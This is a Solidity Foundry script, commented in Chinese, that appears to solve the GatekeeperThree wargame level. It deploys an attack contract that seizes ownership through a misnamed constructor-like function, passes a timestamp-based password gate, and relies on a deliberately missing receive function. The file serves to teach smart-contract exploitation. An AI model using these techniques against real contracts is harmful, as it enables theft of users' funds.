// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

// 簡化接口以便呼叫
interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
    function trick() external view returns (address);
    function owner() external view returns (address);
}

contract Attack {
    IGatekeeperThree public target;

    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }

    // 1. 奪取 Owner
    function takeOwner() public {
        target.construct0r();
    }

    // 2. 觸發 Gate 2
    function solveGate2() public {
        // 先調用一次讓它更新 password 為 block.timestamp
        target.getAllowance(0);
        // 再用 block.timestamp 作為密碼通過
        target.getAllowance(block.timestamp);
    }

    // 3. 進入
    function pwn() public {
        target.enter();
    }

    // 注意：這裡絕對不能有 receive() 或 fallback()
    // 這樣 gateThree 的 payable(owner).send(0.001 ether) 就會回傳 false
}

contract GatekeeperThreeScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address targetAddr = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast(deployerPrivateKey);

        // 步驟 1: 部署攻擊合約
        Attack attacker = new Attack(targetAddr);
        
        // 步驟 2: Gate One - 奪取 Owner
        attacker.takeOwner();

        // 步驟 3: Gate Two - 利用密碼更新機制通過
        IGatekeeperThree(targetAddr).createTrick();
        attacker.solveGate2();

        // 步驟 4: Gate Three - 給 Gatekeeper 錢
        // 直接轉 0.002 ETH 給目標合約，滿足 balance > 0.001
        payable(targetAddr).transfer(0.002 ether);

        // 步驟 5: 最終攻擊
        attacker.pwn();

        vm.stopBroadcast();
    }
}
